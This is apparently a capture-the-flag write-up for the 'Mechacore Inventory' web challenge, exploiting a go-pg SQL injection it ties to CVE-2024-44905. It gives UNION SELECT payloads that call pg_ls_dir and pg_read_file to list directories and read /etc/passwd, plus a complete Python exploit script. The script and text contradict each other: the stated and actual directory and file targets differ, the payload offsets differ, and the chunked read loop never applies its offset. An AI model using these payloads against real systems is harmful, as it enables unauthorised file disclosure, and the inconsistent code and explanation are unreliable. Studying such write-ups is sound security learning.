# CTF Writeup: Mechacore Inventory - Dissecting a Go-pg SQL Injection

* **Challenge Name:** Mechacore Inventory
* **Category:** Web / SQL Injection
* **Description:** "Virelia bought another Mechacore piece of junk. It's now an inventory system for their manufactured parts. Why a water company needs to create robot parts escapes me completely. Maybe we can access the server and clear our doubts."

---

## 1. Initial Reconnaissance & Understanding the Target

Upon connecting to the `Mechacore Inventory` web application, we're presented with an interface that appears to manage manufactured parts. There are input fields suggesting filtering capabilities for items, likely by name or a time-based parameter.

A crucial piece of information, either hinted by the challenge description or revealed through source code review (e.g., `main.go`), is the technology stack: the backend is written in **Go** and utilizes the **`github.com/go-pg/pg/v10`** library to interact with a PostgreSQL database. This immediately flags a potential vulnerability, as `go-pg` in certain versions is known to be susceptible to SQL injection.

### Identifying the Vulnerable Code Snippet

The `main.go` file contains the `dbGetItems` function, responsible for querying the inventory:
```go
    func dbGetItems( lastnseconds int , name string) []Item {
        db := pg.Connect(&pg.Options{
            User: "postgres",
            Password: "postgres",
        })
        defer db.Close()

        var items []Item
        var err error
        fmt.Print(lastnseconds)
        fmt.Print(name)
        if name=="" && lastnseconds==0 {
            err = db.Model(&items).Select()
        } else {
            err = db.Model(&items).
                Where("item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)-? or item.name=?", lastnseconds , name).
            Select()
        }
        if err != nil {
            panic(err)
        }

        return items
    }
```
The critical line for our investigation is within the `Where` clause:

```go
Where("item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)-? or item.name=?", lastnseconds , name).
```

Here, two user-controlled parameters, `lastnseconds` (an integer) and `name` (a string), are directly incorporated into the SQL query string. The `lastnseconds` parameter is preceded by a minus sign (`-`), and `or item.name=?` immediately follows on the same logical line. This specific pattern is characteristic of **CVE-2024-44905**, which was disclosed in June 2025.

## 2. Understanding CVE-2024-44905

**CVE-2024-44905** describes a SQL injection vulnerability affecting `go-pg pg v10.13.0` (and potentially other versions/similar PostgreSQL drivers). The flaw occurs when the library operates in "simple query mode" and encounters a specific pattern of placeholders:

1.  A placeholder for a numeric value (`?`) is directly preceded by a minus sign (`-`).
2.  A second placeholder for a string value is present **after the first placeholder, on the same line**.
3.  Both parameter values are user-controlled.

When these conditions are met, the driver can mistakenly interpret the ` --` sequence (formed by the `-` and the substitution of the numeric placeholder) as a SQL line comment. This comments out the remainder of the *current line* in the generated SQL, including the subsequent string parameter's placeholder (`or item.name=?`).

Crucially, the vulnerability further states that the string parameter (`name` in our case) which was originally part of the commented-out section can then be **inserted unescaped** into the resulting SQL string. This "unescaped insertion" is the key to our injection.

### How the Vulnerable Query is Constructed

Let's illustrate how the SQL is formed in the database, step-by-step:

**1. Original `go-pg` `Where` clause (conceptual template):**
```sql
WHERE item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)- $1 or item.name=$2
```
**2. `lastnseconds` (`$1`) is set to `-1` and the vulnerability triggers:**

The driver interprets `- $1` in such a way that the sequence becomes `--`. This effectively comments out `or item.name=$2` which appears after it on the same logical line.
```sql
WHERE item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)--1 item.name=' [OUR INJECTED PAYLOAD] '
```
Notice that `item.name='` part still remains on the line, but it's now part of the comment.

**3. `name` (`$2`) parameter is processed with injected newline:**

The vulnerability dictates that when the `name` parameter is processed in this state, it is inserted **unescaped**. Our `name` payload starts with a newline character (`%0A` or `\n`). This newline breaks out of the single-line comment, allowing the rest of our payload to be parsed as active SQL.

Given `lastnseconds=-1` and `name='<newline>) <INJECTED SQL STATEMENT> --'`, the SQL query received by PostgreSQL will conceptually look like this:
```sql
SELECT "item".* FROM "items" AS "item"
WHERE item.creation_timestamp >= cast(extract(epoch from current_timestamp) as integer)--1 item.name='
) <INJECTED SQL STATEMENT> -- '
```

As you can see, the `item.name='` part remains, but the newline causes the `)` to close the string literal, and the `<INJECTED SQL STATEMENT>` then executes as part of the query. The final `-- '` comments out the closing quote that `go-pg` would normally add.

## 3. Crafting the Exploit Payloads

Our objective is to execute arbitrary SQL, specifically to list directories (`pg_ls_dir`) and read files (`pg_read_file`). Since our injection point is within a string context (due to `item.name='...'`) and the full query might still have unmatched parentheses, we need to carefully construct our payload.

Based on the `Item` struct provided in the source code:
```go
type Item struct {
    Id       int64
    Name     string
    Type     string // Potential display column for our output
    Status     string
    CreationTimestamp    int64
    Quantity  int64
    OwnerId  int64
    // Owner    *User `pg:"rel:has-one"` // Relation, not direct column in primary SELECT
}
```
There are 7 direct fields (`Id`, `Name`, `Type`, `Status`, `CreationTimestamp`, `Quantity`, `OwnerId`) that `db.Model(&items).Select()` would return. Therefore, our `UNION SELECT` must also provide 7 columns to ensure syntax compatibility. We will target the **3rd column** (index 2) to display our injected data, as `Type` is a `string` and likely displayed in the web UI. Dummy values (`1` or `CAST(1 AS TEXT)`) will fill the other columns.

### Helper for `CHR()` Concatenation

PostgreSQL functions like `pg_ls_dir()` and `pg_read_file()` expect string arguments. To bypass any potential issues with single quotes within our injected SQL (e.g., if the database or driver attempts to re-escape them, or if `item.name='` leaves an open quote that we need to close), we convert our string paths into `CHR()` concatenated expressions.

```py
def path_to_chr_concat(path):
    """Converts a string path to a CHR() concatenated string for SQL injection."""
    return "||".join([f"chr({ord(c)})" for c in path])

# Example: path_to_chr_concat("/var") -> "chr(47)||chr(118)||chr(97)||chr(114)"
```
### Fully Crafted Payload Structures

Our `lastnseconds` parameter will consistently be `-1` to trigger the vulnerability. The `name` parameter will hold the main injection.

#### 3.1. Payload for Directory Listing (`pg_ls_dir`)

This payload aims to list the contents of a target directory (e.g., `/var`) one entry at a time using `LIMIT 1 OFFSET X`. The directory entry will be displayed in the web application's response, specifically where the 3rd selected column of the `UNION SELECT` is rendered (e.g., in the "Type" field of an item).

**HTTP GET Request Parameter Values:**

* **`lastnseconds`:** `-1`

* **`name` (URL-encoded):**
```sql
%0A) union select 1,CAST(1 AS TEXT),(select pg_ls_dir(chr(47)||chr(118)||chr(97)||chr(114)) limit 1 offset 0),CAST(1 AS TEXT),1,1,1-- 
```
**Breakdown of the `name` parameter's components:**

* **`%0A` (Newline):** This is crucial. It forces the remainder of our payload onto a new logical line in the generated SQL, effectively breaking out of the line comment that was initiated by `lastnseconds=-1`.
* **`)`:** This attempts to close any potentially open parenthesis from the original query's structure, ensuring our `UNION SELECT` is syntactically valid.
* **` union select 1,CAST(1 AS TEXT),`**: Starts our `UNION SELECT` statement. We use dummy values (`1` for `int64` and `CAST(1 AS TEXT)` for `string`) for the first two columns to match the original query's column count and data types.
* **`(select pg_ls_dir(chr(47)||chr(118)||chr(97)||chr(114)) limit 1 offset 1)`**: This is the core data extraction.
* `pg_ls_dir(chr(47)||chr(118)||chr(97)||chr(114))`: Calls the PostgreSQL function `pg_ls_dir()` with the path `/var` (constructed using `CHR()` concatenation).

#### 3.2. Payload for File Reading (`pg_read_file`)

Once potential files (like a `flag.txt` or system files such as `/etc/passwd`) are discovered from the directory listing, we can use `pg_read_file()` to extract their contents.

**HTTP GET Request Parameter Values:**

* **`lastnseconds`:** `-1`

* **`name` (URL-encoded):**
        %0A) union select 1,CAST(1 AS TEXT),(select pg_read_file(chr(47)||chr(101)||chr(116)||chr(99)||chr(47)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100),%200,%204096)),CAST(1 AS TEXT),1,1,1--%20

**Breakdown of the `name` parameter's components:**

* `%0A) union select 1,CAST(1 AS TEXT),`**: Same initial parts as the `pg_ls_dir` payload, setting up the `UNION SELECT`.
* `(select%20pg_read_file(chr(47)||chr(101)||chr(116)||chr(99)||chr(47)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100),%200,%204096))`: This is the core file reading extraction.
* `pg_read_file(chr(47)||chr(101)||chr(116)||chr(99)||chr(47)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100))`: Calls the PostgreSQL function `pg_read_file()` with the path `/etc/passwd` (constructed using `CHR()` concatenation).
* `,CAST(1 AS TEXT),1,1,1-- `: Dummy values and the trailing comment.

### 3.3. Exploitation Flow: Scanning `/home/ubuntu` and Retrieving `flag.txt`

To successfully retrieve the flag from `/home/ubuntu/flag.txt`, the general exploitation flow involves two main steps:

1.  **Enumerate the `/home/ubuntu` directory:**
    * Use the `pg_ls_dir` payload (as described in 3.1) with the target path `chr(47)||chr(104)||chr(111)||chr(109)||chr(101)||chr(47)||chr(117)||chr(98)||chr(117)||chr(110)||chr(116)||chr(117)` (for `/home/ubuntu`).
    * Increment the `offset` parameter in successive requests to list all entries within the directory until a file like `flag.txt` (or another suspicious file name) is found. Be aware that in real-world Linux setups, the PostgreSQL user might lack permissions to read user home directories, resulting in a "permission denied" error. In CTFs, this access is often explicitly allowed.

2.  **Read the `flag.txt` file:**
    * Once the exact filename (e.g., `flag.txt`) is confirmed within `/home/ubuntu`, use the `pg_read_file` payload (as described in 3.2).
    * Set the target path to `chr(47)||chr(104)||chr(111)||chr(109)||chr(101)||chr(47)||chr(117)||chr(98)||chr(117)||chr(110)||chr(116)||chr(117)||chr(47)||chr(102)||chr(108)||chr(97)||chr(103)||chr(46)||chr(116)||chr(120)||chr(116)` (for `/home/ubuntu/flag.txt`).
    * The content of the flag file should then be displayed in the web application's response, typically in the field corresponding to the 3rd column of the `UNION SELECT` (e.g., "Type").

This two-step process allows for dynamic discovery of the flag file's location and subsequent extraction of its contents.

---
## 4. Exploitation Script (Python)

To automate the process and interact with the web application, a Python script using the `requests` library is ideal.
```py
import requests
import html

BASE_URL = "http://localhost:80/" # IMPORTANT: Adjust to the actual challenge URL

def path_to_chr_concat(path):
    return "||".join([f"chr({ord(c)})" for c in path])

def extract_data_from_response(response_text):
    matches = response_text.split("<td>")

    results = []
    for content in matches:
        if "Mechacore" not in content and "Sensor" not in content and "Arm" not in content and content.strip() and content != "1":
            results.append(html.unescape(content.strip()).split("</td>")[0]) # Unescape HTML entities

    return list(set(results)) if results else ["<No specific data extracted>"]


print("[*] Stage 1: Attempting to list directory contents of /home/ubuntu")
target_dir_path = "/"
target_dir_chr = path_to_chr_concat(target_dir_path)
MAX_ENTRIES_TO_CHECK = 30

print(f"[*] Listing entries in: {target_dir_path}")
found_entries = []

for offset in range(MAX_ENTRIES_TO_CHECK):
    params_ls_dir = {
        "lastnseconds": "-1",
        "name": f"\n) union select 1,CAST(1 AS TEXT),(select pg_ls_dir({target_dir_chr}) limit 1 offset {offset}),CAST(1 AS TEXT),1,1,1-- "
    }
    
    try:
        response = requests.get(BASE_URL, params=params_ls_dir, timeout=5)
        response.raise_for_status()
        
        extracted_data = extract_data_from_response(response.text)
        
        if extracted_data and extracted_data[0] != "<No specific data extracted>":
            entry = extracted_data[0]
            if entry not in found_entries:
                print(f"[+] Offset {offset}: {entry}")
                found_entries.append(entry)
            
            if "permission denied" in entry.lower() or "no such file or directory" in entry.lower():
                print("[-] Detected permission/existence error, stopping directory enumeration.")
                if "permission denied" in entry.lower() and "/home" in target_dir_path:
                    print("    Note: Access to /home directories by the PostgreSQL user is often restricted for security.")
                break
            if not entry.strip() and offset > 0 and len(found_entries) > 0:
                    print(f"[*] No more discernible entries at offset {offset}. Ending directory enumeration.")
                    break
        else:
            if offset == 0:
                    print(f"[-] Could not extract data for offset {offset}. Check HTML parsing or permissions.")
            elif offset > 0 and len(found_entries) > 0:
                print(f"[*] No new entries at offset {offset}. Ending directory enumeration.")
                break

    except requests.exceptions.Timeout:
        print(f"[-] Request timed out for offset {offset}.")
        break
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for offset {offset}: {e}")
        break
    except Exception as e:
        print(f"[-] An unexpected error occurred at offset {offset}: {e}")
        break

print("\n[*] Stage 1 (Directory Listing) complete. Manually inspect output for interesting files/directories.")

print("\n[*] Stage 2: Attempting to read a file (assuming flag.txt in /home/ubuntu).")
flag_file_path = "/etc/passwd"
flag_file_chr = path_to_chr_concat(flag_file_path)

READ_CHUNK_SIZE = 4096
current_offset = 0
file_content = ""

print(f"[*] Attempting to read: {flag_file_path}")

while True:
    params_read_file = {
        "lastnseconds": "-1",
        "name": f"\n) union select 1,CAST(1 AS TEXT),(select pg_read_file({flag_file_chr})),CAST(1 AS TEXT),1,1,1-- "
    }
    
    try:
        response_read = requests.get(BASE_URL, params=params_read_file, timeout=10)
        response_read.raise_for_status()
        
        extracted_chunk_list = extract_data_from_response(response_read.text)
        chunk = extracted_chunk_list[0] if extracted_chunk_list else ""
        print(extracted_chunk_list)
        if chunk and chunk != "<No specific data extracted>":
            file_content += chunk
            print(f"[+] Read {len(chunk)} bytes from offset {current_offset} of {flag_file_path}")
            current_offset += len(chunk)
            if len(chunk) < READ_CHUNK_SIZE:
                break
        else:
            print(f"[-] No content extracted or end of file for offset {current_offset}.")
            if current_offset == 0:
                    print("    Possible permissions issue or file not found, or incorrect parsing.")
                    if "/home/ubuntu/flag.txt" in flag_file_path and "permission denied" in response_read.text.lower():
                        print("    Consider trying other common flag locations or verifying the exact flag file name in /home/ubuntu.")
            break

    except requests.exceptions.Timeout:
        print(f"[-] Request timed out while reading {flag_file_path} at offset {current_offset}.")
        break
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed while reading {flag_file_path} at offset {current_offset}: {e}")
        break
    except Exception as e:
        print(f"[-] An unexpected error occurred while reading {flag_file_path} at offset {current_offset}: {e}")
        break

if file_content:
    print(f"\n--- Content of {flag_file_path} ---")
    print(file_content)
    print("-----------------------------------")
    if "THM{" in file_content:
        print("[*] Possible flag or sensitive information found!")
else:
    print(f"[-] Failed to read content from {flag_file_path}.")

print("\n[*] Exploitation process complete.")
```